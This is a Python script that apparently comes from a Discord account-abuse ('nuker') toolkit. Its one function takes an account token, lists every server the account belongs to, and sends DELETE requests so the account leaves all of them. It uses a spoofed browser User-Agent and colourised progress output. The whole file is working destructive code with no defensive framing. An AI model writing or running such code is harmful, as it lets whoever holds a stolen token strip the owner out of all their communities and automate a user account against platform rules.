
import requests
import time
from colorama import Fore, Style

def getheaders(token):
    return {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

def new_title(title):
    print(f"\n{Fore.CYAN}{'='*50}")
    print(f"{Fore.YELLOW}{title.center(50)}")
    print(f"{Fore.CYAN}{'='*50}{Fore.RESET}\n")

def leaveServer(token):
    """Leave all Discord servers"""
    new_title('Server Leaver')
    print(f"{Fore.YELLOW}[!] Leaving all servers...{Fore.RESET}")
    
    try:
        headers = {'Authorization': token}
        guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=getheaders(token)).json()
        for guild in guildsIds:
            for i in range(2):
                try:
                    response = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/'+guild['id'], headers=headers)
                    if i == 1:
                        if response.status_code in (200, 204):
                            print(f"{Fore.GREEN}[+] {Fore.BLUE}Server={Fore.WHITE}{guild['name']}{Fore.RESET} {Fore.LIGHTBLACK_EX}[{Fore.GREEN}LEFT{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
                        else:
                            print(f"{Fore.RED}[-] {Fore.BLUE}Server={Fore.WHITE}{guild['name']}{Fore.RESET} {Fore.LIGHTBLACK_EX}[{Fore.RED}FAILED TO LEAVE{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
                            if response.status_code != 404:
                                print(f"Status: {response.status_code}")
                                print(response.text)
                        
                    time.sleep(0.5)  # Rate limiting
                    
                except Exception as e:
                    print(f"{Fore.RED}[-] Error leaving server {guild.get('name', 'unknown')}: {e}{Fore.RESET}")
                
    except Exception as e:
        print(f"{Fore.RED}[-] Leave servers failed: {e}{Fore.RESET}")
